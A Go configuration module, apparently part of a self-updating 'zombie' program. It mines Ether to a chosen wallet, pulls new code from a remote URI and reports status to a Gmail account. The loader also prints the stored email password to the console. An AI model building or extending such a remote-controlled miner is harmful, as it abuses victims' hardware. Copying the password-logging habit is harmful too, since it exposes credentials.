package config

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"time"

	"github.com/seantcanavan/utils"
)

type Config struct {
	CheckInGmailCredentialsFile string        `json:"CheckInGmailCredentialsFile"` // The email address where this program will report regular status updates to
	CheckInFrequencySeconds     time.Duration `json:"CheckInFrequencySeconds"`     // The frequency with which this program will send status updates. In seconds.
	UpdateFrequencySeconds      int           `json:"UpdateFrequencySeconds"`      // The frequency with which this program will attempt to update itself. In seconds.
	RemoteUpdateURI             string        `json:"RemoteUpdateURI"`             // The remote location where new source code can be obtained from for this program.
	RemoteVersionURI            string        `json:"RemoteVersionURI"`            // The remote URI where the latest version number of this program can be obtained from.
	LocalVersionURI             string        `json:"LocalVersionURI"`             // The local URI where the current running version of this program can be obtained from.
	LocalVersion                uint64        `json:"LocalVersion"`                // The local version of this program that is currently running.
	EtherWallet                 string        `json:"EtherWallet"`                 // The wallet address of whatever Ethereum wallet you want your mining contributions to go to.
	MineEther                   bool          `json:"MineEther"`                   // Whether or not this zombie should mine ether.
	GPUMine                     bool          `json:"GPUMine"`                     // If this zombie is mining ether, should it GPU mine?
	CPUMine                     bool          `json:"CPUMine"`                     // If this zombie is mining ether, should it CPU mine?
	DeviceName                  string        `json:"DeviceName"`
	DeviceId                    string        `json:"DeviceId"`
	InitialStartup              bool          `json:"InitialStartup"`      // Whether or not this is the first time that the program is starting.
	FirstRunAfterUpdate         bool          `json:"FirstRunAfterUpdate"` // Whether or not this is the first time that the program is running after an update has been executed.

	// You may manually set these values in your code if it remains private to you only. Otherwise you may configure the email credentials file instead for the values to be pulled from.
	CheckInGmailAddress  string // the gmail address to send updates to and receive updates from. parsed from line 1 of CheckInEmailCredentialsFile
	CheckInGmailPassword string // the password for the gmail account. parsed from line 2 of CheckInEmailCredentialsFile
}

// ConfigFromFile is a constructor which will generate a config struct from the
// given file path which should point to a valid JSON file containing key and
// value pairs for all the fields in the config struct that you wish to use
// throughout the code. A sample config file is provided, config.json, which
// tells you all of the possible fields to include as well as hopefully enough
// of a clue as to what their use is.
func ConfigFromFile(fileName string) (*Config, error) {

	bytes, loadErr := ioutil.ReadFile(fileName)
	if loadErr != nil {
		return nil, loadErr
	}

	var conf Config

	jsonErr := json.Unmarshal(bytes, &conf)
	if jsonErr != nil {
		fmt.Println(fmt.Sprintf("Error unmarshalling the config file into a struct: %v", jsonErr))
		return nil, jsonErr
	}

	fileLines, emailErr := utils.ReadLines(conf.CheckInGmailCredentialsFile)
	if emailErr != nil {
		fmt.Println(fmt.Sprintf("Email credentials file issue: %v", emailErr))
		return nil, emailErr
	}

	conf.CheckInGmailAddress = fileLines[0]
	conf.CheckInGmailPassword = fileLines[1]

	fmt.Println("Loaded config from file:")
	fmt.Printf("%+v\n", conf)
	return &conf, nil
}
